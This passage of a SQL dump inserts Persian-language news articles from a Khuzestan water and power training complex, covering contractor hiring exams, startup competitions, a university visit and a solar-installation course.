	<strong><a href="https://kwphc.ir/Azmoon/AzmoonAdv/Adv14031126.pdf" target="_blank"><span style="color:#800080;"><span style="font-size:16px;">دریافت آگهی</span></span></a></strong></p>
<p dir="RTL" style="margin-right: 0.2pt; text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140311/" target="_blank"><span style="color:#0000cd;"><span style="font-size:16px;"><strong>لینک ثبت نام</strong></span></span></a></p>
', '62272ExamNews.jpg', 1701, '1403/11/26', '5:31:03 PM', 1403, 'بهمن', 11, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62273, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'بررسی همکاری‌های مرکز رشد شهدای صنعت آب و برق خوزستان و بنیاد نخبگان خوزستان', '<p style="text-align: justify;">
	<span dir="RTL">در تاریخ ۲۴ بهمن، نشستی با حضور دکتر کردزنگنه، رئیس بنیاد نخبگان خوزستان و&nbsp; مرکز رشد شهدای صنعت آب و برق خوزستان و جمعی از مسئولان و نخبگان برگزار شد. در این نشست، موضوع حمایت از مخترعان و تجاری&zwnj;سازی ایده&zwnj;های نوآورانه مورد بحث و بررسی قرار گرفت</span>.</p>', '<p dir="RTL" style="text-align: justify;">
	در تاریخ ۲۴ بهمن، نشستی با حضور دکتر کردزنگنه، رئیس بنیاد نخبگان خوزستان و&nbsp; مرکز رشد شهدای صنعت آب و برق خوزستان و جمعی از مسئولان و نخبگان برگزار شد. در این نشست، موضوع حمایت از مخترعان و تجاری&zwnj;سازی ایده&zwnj;های نوآورانه مورد بحث و بررسی قرار گرفت<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	محمد لیموئی ضمن تبریک اعیاد شعبانیه، به ظرفیت&zwnj;های مرکز رشد اشاره کرد و تأکید داشت که وظیفه اصلی مخترعان تولید علم است، اما رسالت مرکز رشد، تجاری&zwnj;سازی این دستاوردها و رساندن آن&zwnj;ها به مرحله تولید و بازار است. وی همچنین به مدل&zwnj;های درآمدی و روش&zwnj;های سودآوری استارتاپ&zwnj;ها پرداخته و اهمیت برنامه&zwnj;ریزی اقتصادی برای اختراعات را مورد تأکید قرار داد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	دکتر کردزنگنه، رئیس بنیاد نخبگان خوزستان نیز با اشاره به سیاست&zwnj;های حمایتی بنیاد نخبگان، بیان کرد که حمایت این بنیاد به&zwnj;طور ویژه بر اختراعاتی متمرکز است که قابلیت تجاری&zwnj;سازی داشته باشند. وی از ادامه همکاری&zwnj;ها میان بنیاد و مرکز رشد خبر داد و بر ضرورت استمرار این جلسات تأکید کرد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در این نشست، دکتر طالب&zwnj;زاده، مسئول ارتباط با صنعت مجتمع، به فرایند تجاری&zwnj;سازی و معرفی شرکت&zwnj;هایی که می&zwnj;توانند در این مسیر نقش&zwnj;آفرینی کنند، پرداخت. همچنین سرکار خانم دکتر ساکی، معاونت آموزشی و پژوهشی مجتمع ، با توجه به اهمیت رویدادهای برگزارشده توسط مرکز رشد، خواستار حمایت بیشتر از طرح&zwnj;های پژوهشی که قابلیت تولید و ورود به بازار را دارند، شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در پایان، مقرر شد که مرکز رشد شهدای صنعت آب و برق خوزستان به&zwnj;عنوان یکی از مجموعه&zwnj;های واجد شرایط بهره&zwnj;مندی از ماده ۱۶ قانون جهش تولید دانش&zwnj;بنیان، به بنیاد نخبگان معرفی شود. این قانون با هدف توسعه سیاست&zwnj;های حمایت از انرژی&zwnj;های تجدیدپذیر و تشویق صنایع و بخش مسکن به استفاده از این منابع تدوین شده است<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	همچنین، در این جلسه یکی از اختراعات مستقر در مرکز رشد که مورد ارزیابی بنیاد نخبگان قرار گرفته بود، بررسی شد. طی بازدید از نمونه پایلوت این دستگاه، شرکت&zwnj;هایی که متقاضی سرمایه&zwnj;گذاری و خرید این فناوری بودند، معرفی شدند. در نهایت، دکتر کردزنگنه فرآیند ارزیابی و داوری این اختراع را برای عضویت در بنیاد نخبگان و دریافت سطح سه توضیح داد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این جلسه گامی مهم در راستای توسعه تعاملات میان بنیاد نخبگان و مرکز رشد، حمایت از نخبگان، و تسریع در مسیر تجاری&zwnj;سازی فناوری&zwnj;های نوین محسوب می&zwnj;شود.</p>
<p>
	&nbsp;</p>', '62273photojal.jpg', 1361, '1403/11/27', '6:49:49 AM', 1403, 'بهمن', 11, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62275, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'آزمون تبدیل وضعیت و ارتقاء شغلی کارکنان شرکت توزیع برق استان کرمانشاه برگزار شد', '<p style="text-align: justify;">
	به گزارش شبکه خبری سازمان آب و برق خوزستان، این آزمون توسط اداره صلاحیت حرفه&zwnj;ای و آزمون های مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور ۱۰۳ نفر از کارکنان آن شرکت برگزار شد.</p>', '<p style="text-align: justify;">
	به گزارش شبکه خبری سازمان آب و برق خوزستان، این آزمون توسط اداره صلاحیت حرفه&zwnj;ای و آزمون های مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور ۱۰۳ نفر از کارکنان آن شرکت برگزار شد.</p>
<p style="text-align: justify;">
	این اقدام به منظور تقویت توانمندی&zwnj;های نیروی انسانی و افزایش بهره&zwnj;وری در شرکت توزیع برق استان کرمانشاه انجام شده است.</p>', '62274Untitledxx.jpg', 287, '1403/11/29', '12:23:30 AM', 1403, 'بهمن', 11, '29');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62276, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آگهي آزمون بکارگیری نیروی حجمي', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت های پیمانکار طرف قرارداد شرکت سهامي برق منطقه ای خوزستان به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید<span dir="LTR">.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکتهای پیمانکار <span style="color:#9933cc;"><strong>دزیاران کارون، شمیم مهر آریا و پارس وحدت اکسین&nbsp;</strong></span> طرف قرارداد شرکت سهامي برق منطقه ای خوزستان به منظور تأمین نیروي انساني مورد نیاز، تعدادي ازآقايان و خانمهای واجد شرایط را از میان داوطلبان بومي و از طریق برگزاري آزمون توانمنديهاي عمومي و تخصصي (کتبي) و آزمون دانش مهارت (مصاحبه) و طي فرایند گزینش و به ترتیب از بالاترین نمره با شرایط ذیل و در قالب قرارداد نیروی حجمي جذب و بکارگیري مينمایند<span dir="LTR">.</span></p>
<ul dir="rtl">
	<li style="text-align: justify;">
		داشتن تابعيت نظام جمهوري اسلامي ايران<span dir="LTR">.</span></li>
	<li style="text-align: justify;">
		التزام به قانون اساسي جمهوري اسلامي ايران</li>
	<li style="text-align: justify;">
		اعتقاد به دين مبين اسلام يا يكي از اديان شناخته شده در قانون اساسي جمهوري اسلامي ايران<span dir="LTR">.</span></li>
	<li style="text-align: justify;">
		دارا بودن شرايط احراز شغل متناسب با جدول نيازهاي اعلامي و توانايي لازم براي شغل مورد نظر</li>
	<li style="text-align: justify;">
		احراز صلاحيتهاي عمومي به تأييد گزينش پس از قبولي در آزمون کتبي و مصاحبه و تست ورزش براي شغل آتش نشان</li>
	<li style="text-align: justify;">
		انجام خدمت دوره ضرورت يا معافیت قانونی دائم <span style="color:#b22222;">(معافیت پزشکی و معاف از رزم در شغل آتش نشان مورد پذیرش نمی باشد<span dir="LTR">(</span></span></li>
	<li style="text-align: justify;">
		عدم اعتياد به هرگونه مواد مخدر و يا مشروبات الكلي</li>
	<li style="text-align: justify;">
		نداشتن سابقه محكوميت کيفري و ارائه گواهي عدم سوء پيشينه</li>
	<li style="text-align: justify;">
		داشتن سلامت جسماني و رواني و توانايي لازم براي انجام وظايف شغل مورد نظر</li>
	<li style="text-align: justify;">
		<span style="color:#008080;">تبصره 1 : کليه متقاضيان در صورت قبولي آزمون موظف به ارائه گواهي سلامت جسماني از مراکز طب کار هستند</span></li>
	<li style="text-align: justify;">
		نداشتن منع قانوني براي جذب و عدم تعهد خدمتي به ديگر سازمانها و شرکتهاي دولتي يا خصوصي</li>
	<li style="text-align: justify;">
		نداشتن سابقه اخراج از شرکتهاي پيمانكاري در حوزه عملياتي شرکتهاي برق</li>
	<li style="text-align: justify;">
		کسب حد نصاب نمره آزمون کتبي (حداقل 50 درصد ميانگين نمره مكتسبه سه نفر اول آزمون در همان شهرستان/شهر و در هر شغل<span dir="LTR">( </span></li>
	<li style="text-align: justify;">
		دارا بودن شرايط سني مورد نياز(مطابق با مفاد اين آگهي<span dir="LTR">(</span></li>
</ul>
<p style="text-align: center;">
	<a href="https://kwphc.ir/Azmoon/AzmoonAdv/Adv14031129.pdf" target="_blank"><strong><span style="font-size:16px;"><span style="color:#800080;">دریافت فایل راهنما</span></span></strong></a></p>
<p style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140312" target="_blank"><span style="color:#4b0082;"><strong><span style="font-size:16px;">لینک ثبت نام</span></strong></span></a></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_218.jpeg" style="height: 788px; width: 600px;" /></p>
', '62276ExamNews3.jpg', 5161, '1403/11/29', '8:31:55 AM', 1403, 'بهمن', 11, '29');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62277, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آگهي آزمون بکارگیری نیروی حجمي', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت پیمانکار دنیاکاران جنوب شرکت توزیع نیروی برق اهواز به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
', '<p dir="RTL">
	به اطلاع مي رساند <strong><span style="color:#9900ff;">شرکت پیمانکار دنیاکاران جنوب </span></strong>طرف قرارداد شرکت توزیع نیروی برق اهواز به منظور تأمين نيروي انساني مورد نياز، تعداد 8 نفر(تعداد: 2 نفر به عنوان سیمبان خط گرم، 1 نفر به عنوان راننده خودرو سنگین- پایه یکم، 1 نفر مامورقرائت کنتور و 4 نفر نیروی خدمات) از آقایان واجد شرايط را از طريق برگزاري آزمون توانمنديهاي عمومي وتخصصي (كتبي) و آزمون دانش مهارت (مصاحبه) و طي فرآيند گزينش و به ترتيب از بالاترين نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب مي نمايد<span dir="LTR">.</span></p>
<p dir="RTL">
	<strong>شرايط عمومي:</strong></p>
<ul dir="rtl">
	<li>
		داشتن تابعیت نظام جمهوری اسلامي ایران</li>
	<li>
		التزام به قانون اساسي جمهوری اسلامي ایران</li>
	<li>
		اعتقاد به دین مبین اسلام یا یکي از ادیان شناخته شده در قانون اساسي جمهوری اسلامي ایران</li>
	<li>
		دارا بودن شرایط احراز شغل و توانایي انجام کار</li>
	<li>
		احراز صلاحیت های عمومي به تأیید هسته گزینش</li>
	<li>
		داشتن کارت پایان خدمت نظام وظیفه یا معافیت قانوني دائم غیر پزشکي تا تاریخ برگزاری آزمون الزامي مي باشد</li>
	<li>
		عدم اعتیاد به مواد مخدر و دخانیات</li>
	<li>
		نداشتن سابقه محکومیت جزایي مؤثر</li>
	<li>
		داشتن سلامت جسماني، روحي و رواني</li>
	<li>
		دارا بودن شرایط فیزیکي و جسماني لازم، <span style="color:#b22222;">(با تایید پزشک معتمد شرکت توزیع نیروی برق اهواز)</span></li>
	<li>
		دارا بودن قدرت تحرک وتوانایي جسمي لازم</li>
	<li>
		سلامت کامل بینایي</li>
	<li>
		سلامت کامل ستون قفرات</li>
	<li>
		نداشتن بیماری خاص ویا تصادفي که منجر به استفاده از پلاتین در اعضای بدن شده باشد</li>
	<li>
		عدم داشتن منع قانوني جهت بکارگیری و نداشتن تعهد خدمت به دیگر سازمانها وشرکت های دولتي و خصوصي</li>
	<li>
		دارا بودن شرایط سني موردنیاز <span style="color:#b22222;">(مطابق با مفاد آین آگهي)</span></li>
</ul>
<p style="text-align: center;">
	<a href="https://kwphc.ir/Azmoon/AzmoonAdv/Adv14031130.pdf" target="_blank"><span style="font-size:16px;"><strong><span style="color:#800080;">دریافت فایل راهنما</span></strong></span></a></p>
<p style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140312-2/" target="_blank"><span style="color:#4b0082;"><span style="font-size:16px;"><strong>لینک ثبت نام</strong></span></span></a></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_219.jpeg" style="height: 744px; width: 600px;" /></p>
<p>
	&nbsp;</p>
', '62277ExamNews4.jpg', 3352, '1403/11/29', '2:42:06 PM', 1403, 'بهمن', 11, '29');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62278, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', '"اختتامیه رقابت‌های ریسرچ‌پیچ و اینوتکس‌پیچ خوزستان: معرفی طرح‌های برتر و تیم‌های منتخب"', '<p>
	رقابت&zwnj;های ریسرچ&zwnj;پیچ و اینوتکس&zwnj;پیچ خوزستان با حمایت مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و مرکز رشد دانشگاه شهید چمران اهواز به پایان رسید.</p>', '<p>
	رقابت&zwnj;های ریسرچ&zwnj;پیچ و اینوتکس&zwnj;پیچ خوزستان با حمایت مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و مرکز رشد دانشگاه شهید چمران اهواز به پایان رسید. در بخش ریسرچ&zwnj;پیچ، ۲۱ طرح پژوهشی ثبت و ۱۲ طرح به مرحله ارائه حضوری راه یافتند. پنج طرح برتر شامل بومی&zwnj;سازی کمپرسور سیلندر پیستونی، بتن بایولوژیک، آشکارساز التراسونیک، لوله&zwnj;های نوری خورشیدی و امواج گرمایی سفارشی معرفی شدند.&nbsp;</p>
<p>
	در رقابت اینوتکس&zwnj;پیچ، ۴۳ طرح ارزیابی و ۱۳ تیم به مرحله ارائه حضوری راه پیدا کردند. تیم &laquo;آلتین کاغذ&raquo; مقام اول را برای تولید کاغذ با کودهای حیوانی کسب کرد و تیم &laquo;ادیب گستر اروند&raquo; مقام دوم را به دست آورد. همچنین تیم دانش&zwnj;آموزی &laquo;راما&raquo; به عنوان طرح شایسته تقدیر معرفی شد.&nbsp;</p>
<p>
	تیم&zwnj;های منتخب هر دو رویداد مجوز حضور در مرحله نهایی این رقابت&zwnj;ها که از ۹ تا ۱۲ اردیبهشت ۱۴۰۴ در پارک فناوری پردیس برگزار می&zwnj;شود، کسب کردند. دکتر مهدی هودگر و دکتر اسماعیل عرب زاده نیز به عنوان داوران اصلی در این رویداد حضور داشتند.</p>', '62278Untitled.jpg', 89, '1403/12/3', '1:37:12 AM', 1403, 'اسفند', 12, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62279, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری موفق رویداد استارتاپی سواد آبی با ارائه ۱۲ طرح برتر', '<p style="text-align: justify;">
	رویداد استارتاپی سواد آبی با هدف ارتقای دانش و آگاهی عمومی در حوزه مدیریت منابع آبی به&zwnj;طور موفقیت&zwnj;آمیز برگزار شد و ۱۲ طرح استارتاپی به مرحله نهایی راه پیدا کردند. این رویداد با حضور داورانی تخصصی در حوزه آب همچون دکتر ممبینی، رئیس سازمان بسیج علمی، پژوهشی و فناوری خوزستان؛ دکتر نصراصفهانی، رئیس گروه دفتر نوآوری و توسعه سازمان آب و برق خوزستان؛ و دکتر مقسمی، رئیس گروه آموزش سازمان آب و برق خوزستان و خانم مهندس احمدی دبیر ستاد سواد آبی سازمان آب و برق خوزستان برگزار شد.</p>', '<p style="text-align: justify;">
	رویداد استارتاپی سواد آبی با هدف ارتقای دانش و آگاهی عمومی در حوزه مدیریت منابع آبی به&zwnj;طور موفقیت&zwnj;آمیز برگزار شد و ۱۲ طرح استارتاپی به مرحله نهایی راه پیدا کردند. این رویداد با حضور داورانی تخصصی در حوزه آب همچون دکتر ممبینی، رئیس سازمان بسیج علمی، پژوهشی و فناوری خوزستان؛ دکتر نصراصفهانی، رئیس گروه دفتر نوآوری و توسعه سازمان آب و برق خوزستان؛ و دکتر مقسمی، رئیس گروه آموزش سازمان آب و برق خوزستان و خانم مهندس احمدی دبیر ستاد سواد آبی سازمان آب و برق خوزستان برگزار شد.&nbsp;</p>
<p style="text-align: justify;">
	دکتر مهدی هودگر، ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، در ابتدای این رویداد ضمن خوشامدگویی به داوران، مهمانان و عوامل اجرایی، بر اهمیت موضوع مدیریت منابع آبی و ضرورت ارتقای سواد آبی در جامعه تأکید کرد. وی گفت: &quot;حضور ایده&zwnj;های نوآورانه در این رویداد نشان&zwnj;دهنده پتانسیل بالای جوانان کشور در حل چالش&zwnj;های مربوط به منابع آب است.&quot;&nbsp;</p>
<p style="text-align: justify;">
	در این رویداد، داورانی از حوزه&zwnj;های مختلف از جمله مدیریت منابع آب، اقتصاد، کسب و کار و نرم&zwnj;افزارهای کامپیوتری به ارزیابی و داوری طرح&zwnj;ها پرداختند. طرح&zwnj;های ارائه شده در زمینه&zwnj;هایی نظیر بهینه&zwnj;سازی مصرف آب، حسگرهای هوشمند، پیش&zwnj;بینی بحران&zwnj;های آبی و بازی&zwnj;های دیجیتال با هدف آموزش و ارتقای سواد آبی بود. پس از ارزیابی&zwnj;های دقیق، ۱۲ طرح منتخب به مرحله نهایی رسیدند و به ارائه ایده&zwnj;های خود پرداختند.</p>
<p style="text-align: justify;">
	این طرح&zwnj;ها از حمایت&zwnj;های تخصصی مرکز رشد شهدای صنعت آب و برق خوزستان برخوردار خواهند شد که شامل کمک در توسعه بیزینس پلن، تجاری&zwnj;سازی و معرفی به بازار است. این رویداد به&zwnj;عنوان یک گام بزرگ در جهت جذب و پشتیبانی از استارتاپ&zwnj;های نوآورانه در حوزه منابع آبی، می&zwnj;تواند به بهبود مدیریت منابع آب در کشور کمک شایانی کند و همچنین آگاهی عمومی نسبت به مسائل مهم آب را افزایش دهد.</p>', '62279Untitleddd.jpg', 112, '1403/12/3', '1:40:14 AM', 1403, 'اسفند', 12, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62280, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'بازدید سرپرست دانشگاه جامع علمی کاربردی از دانشگاه صنعت آب و برق خوزستان', '<p style="text-align: justify;">
	دکتر علی اکبری، ریاست محترم دانشگاه جامع علمی کاربردی کشور به همراه هیئتی متشکل از دکتر بهرهی سرپرست دانشگاه علمی کاربردی استان خوزستان، معاونت برنامه ریزی سازمان آب و برق خوزستان، و معاونین آموزشی و پژوهشی استان، از زیرساخت&zwnj;های آموزشی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بازدید کرد. این بازدید به منظور بررسی شرایط اعطای مجوز جذب دانشجوی بین&zwnj;المللی، به ویژه از کشور عراق، انجام شد.</p>', '<p style="text-align: justify;">
	دکتر علی اکبری، ریاست محترم دانشگاه جامع علمی کاربردی کشور به همراه هیئتی متشکل از دکتر بهرهی سرپرست دانشگاه علمی کاربردی استان خوزستان، معاونت برنامه ریزی سازمان آب و برق خوزستان، و معاونین آموزشی و پژوهشی استان، از زیرساخت&zwnj;های آموزشی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بازدید کرد. این بازدید به منظور بررسی شرایط اعطای مجوز جذب دانشجوی بین&zwnj;المللی، به ویژه از کشور عراق، انجام شد.</p>
<p style="text-align: justify;">
	در این بازدید، پرفسور علی اکبری ضمن بررسی عملکرد آموزشی، پژوهشی و فن آوری مدیران مجتمع، از تلاش&zwnj;ها و اقدامات صورت گرفته در راستای ارتقاء کیفیت آموزشی تقدیر کرد و بر اهمیت جذب دانشجویان بین&zwnj;المللی تاکید نمود. وی همچنین به لزوم فراهم کردن امکانات و خدمات مناسب برای این دانشجویان اشاره کرد و گفت: &quot;جذب دانشجویان بین&zwnj;المللی نه تنها به افزایش تبادل فرهنگی کمک می&zwnj;کند، بلکه می&zwnj;تواند موجب ارتقاء سطح علمی و پژوهشی دانشگاه نیز شود.&quot;</p>
<p style="text-align: justify;">
	دکتر هودگر، رئیس محترم مجتمع نیز در این دیدار ضمن خوشامدگویی به ریاست دانشگاه، از آمادگی زیرساخت&zwnj;های مجتمع عالی آموزشی صنعت آب و برق برای جذب دانشجویان بین&zwnj;المللی خبر داد. وی افزود: &quot;ما تمامی امکانات لازم را برای ارائه آموزش با کیفیت و تسهیل روند پذیرش دانشجویان خارجی فراهم کرده&zwnj;ایم و امیدواریم با همکاری&zwnj;های مشترک، بتوانیم به هدف جذب دانشجویان بین&zwnj;المللی دست یابیم.&quot;</p>', '62280Untitledee.jpg', 149, '1403/12/3', '1:42:16 AM', 1403, 'اسفند', 12, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62281, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'سفر زیارتی مناطق عملیاتی جنوب کشور ویژه پرسنل مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p dir="RTL">
	<span style="font-size:14px;">به گزارش روابط عمومی مجتمع آموزشی آب و برق خوزستان، در روز جمعه مورخ ۱۴۰۳/۱۲/۳ کاروان راهیان نور ویژه خانواده های پرسنل مجتمع به مناطق عملیاتی جنوب کشور اعزام شدند <span dir="LTR">.</span></span></p>
<p style="text-align: justify;">
	&nbsp;</p>
', '<p dir="RTL">
	<span style="font-size:14px;">به گزارش روابط عمومی مجتمع آموزشی آب و برق خوزستان، در روز جمعه مورخ ۱۴۰۳/۱۲/۳ کاروان راهیان نور ویژه خانواده های پرسنل مجتمع به مناطق عملیاتی جنوب کشور اعزام شدند <span dir="LTR">.</span></span></p>
<p>
	&nbsp;</p>
', '62281deb.jpg', 203, '1403/12/5', '8:49:30 AM', 1403, 'اسفند', 12, '5');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62282, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری آزمون جذب نیروی حجمی در شرکت توزیع برق استان کرمانشاه', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، آزمون جذب نیروی حجمی شرکت&zwnj;های پیمانکار طرف قرارداد شرکت توزیع برق استان کرمانشاه در تاریخ&zwnj;های 6 و 7 اسفند ماه به شیوه مهارتی برگزار شد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، آزمون جذب نیروی حجمی شرکت&zwnj;های پیمانکار طرف قرارداد شرکت توزیع برق استان کرمانشاه در تاریخ&zwnj;های 6 و 7 اسفند ماه به شیوه مهارتی برگزار شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این آزمون با حضور 120 نفر از متقاضیان جذب، توسط اداره صلاحیت حرفه&zwnj;ای و آزمون&zwnj;های مجتمع آموشی آب و برق خوزستان برگزار گردید<span dir="LTR">.</span></p>', '62282f8d.jpg', 618, '1403/12/8', '9:32:32 AM', 1403, 'اسفند', 12, '8');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62283, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'اختتامیه رویدادهای استارتاپی فناوری‌های نوین در حوزه انرژی‌های تجدیدپذیر و سواد آبی: شناسایی و حمایت از ایده‌های خلاقانه', '<p dir="RTL">
	اختتامیه رویدادهای استارتاپی فناوری&zwnj;های نوین در حوزه انرژی&zwnj;های تجدیدپذیر و سواد آبی، در تاریخ ۷ اسفند ۱۴۰۲ در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور جمعی از متخصصان، فعالان صنعت و علاقه&zwnj;مندان به نوآوری برگزار شد. این رویدادها با هدف شناسایی و حمایت از ایده&zwnj;های نوآورانه و ارائه راهکارهای عملی برای چالش&zwnj;های کلیدی در این حوزه&zwnj;ها طراحی شده بودند<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	اختتامیه رویدادهای استارتاپی فناوری&zwnj;های نوین در حوزه انرژی&zwnj;های تجدیدپذیر و سواد آبی، در تاریخ ۷ اسفند ۱۴۰۲ در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور جمعی از متخصصان، فعالان صنعت و علاقه&zwnj;مندان به نوآوری برگزار شد. این رویدادها با هدف شناسایی و حمایت از ایده&zwnj;های نوآورانه و ارائه راهکارهای عملی برای چالش&zwnj;های کلیدی در این حوزه&zwnj;ها طراحی شده بودند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	دکتر هودگر، رئیس این رویداد، در سخنرانی خود به اهمیت حضور تیم&zwnj;های خلاق و نوآور اشاره کرد و گفت: &laquo;در رویداد استارتاپی انرژی&zwnj;های تجدیدپذیر، ۱۴ ایده برتر به مرحله نهایی رسیدند که نشان&zwnj;دهنده پتانسیل بالای جوانان کشور در این حوزه است. همچنین، در رویداد سواد آبی، ۱۳ تیم راهکارهای فناورانه خود را ارائه کردند که می&zwnj;تواند به بهبود مدیریت منابع آب کمک کند<span dir="LTR">.&raquo;</span></p>
<p dir="RTL" style="text-align: justify;">
	وی افزود: &laquo;این رویدادها تنها یک مسابقه برای ایده&zwnj;ها نیستند، بلکه بستری برای تحول در صنعت آب و انرژی کشور محسوب می&zwnj;شوند. ما به دنبال ایجاد فضایی هستیم که نوآوری&zwnj;ها بتوانند به راحتی رشد کنند و به مرحله اجرایی برسند<span dir="LTR">.&raquo;</span></p>
<p dir="RTL" style="text-align: justify;">
	در پایان مراسم، از تیم&zwnj;های برتر با اعطای جوایز نقدی و فرصت&zwnj;های حمایتی تقدیر شد. این جوایز شامل مشاوره&zwnj;های تخصصی، حمایت مالی و دسترسی به شبکه&zwnj;های سرمایه&zwnj;گذاری بود<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '62283gggg.jpg', 453, '1403/12/9', '11:09:49 AM', 1403, 'اسفند', 12, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62284, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'اولین دوره عملی طراحی و نصب سیستم‌های تولید برق از انرژی خورشیدی در خوزستان برگزار شد', '<p dir="RTL" style="text-align: justify;">
	برای نخستین بار در استان خوزستان، دوره&zwnj;ای کاملاً عملی در زمینه طراحی و نصب سیستم&zwnj;های تولید برق از انرژی خورشیدی در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این دوره با استقبال و رضایت حداکثری شرکت&zwnj;کنندگان همراه بود و به هدف ارتقای دانش فنی و مهارت&zwnj;های عملی افراد علاقه&zwnj;مند به حوزه انرژی&zwnj;های تجدیدپذیر طراحی و اجرا گردید<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	برای نخستین بار در استان خوزستان، دوره&zwnj;ای کاملاً عملی در زمینه طراحی و نصب سیستم&zwnj;های تولید برق از انرژی خورشیدی در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این دوره با استقبال و رضایت حداکثری شرکت&zwnj;کنندگان همراه بود و به هدف ارتقای دانش فنی و مهارت&zwnj;های عملی افراد علاقه&zwnj;مند به حوزه انرژی&zwnj;های تجدیدپذیر طراحی و اجرا گردید<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	محورهای اصلی این دوره شامل آموزش الزامات و طراحی نیروگاه خورشیدی، اجرای موفقیت&zwnj;آمیز یک نیروگاه آن&zwnj;گرید<span dir="LTR"> (On-Grid) </span>و اجرای موفقیت&zwnj;آمیز یک نیروگاه آف&zwnj;گرید<span dir="LTR"> (Off-Grid) </span>بود<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این دوره به عنوان اولین تجربه آموزشی عملی در خوزستان، شرکت&zwnj;کنندگان را در نصب و راه&zwnj;اندازی نیروگاه&zwnj;های واقعی مشارکت داد و دانش به&zwnj;روز و تخصصی را با تمرکز بر مهارت&zwnj;های عملی ارائه کرد. همچنین، این رویداد به ایجاد یک مسیر مشخص برای تربیت متخصصان و تکنسین&zwnj;های بومی در حوزه انرژی خورشیدی کمک شایانی نمود<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
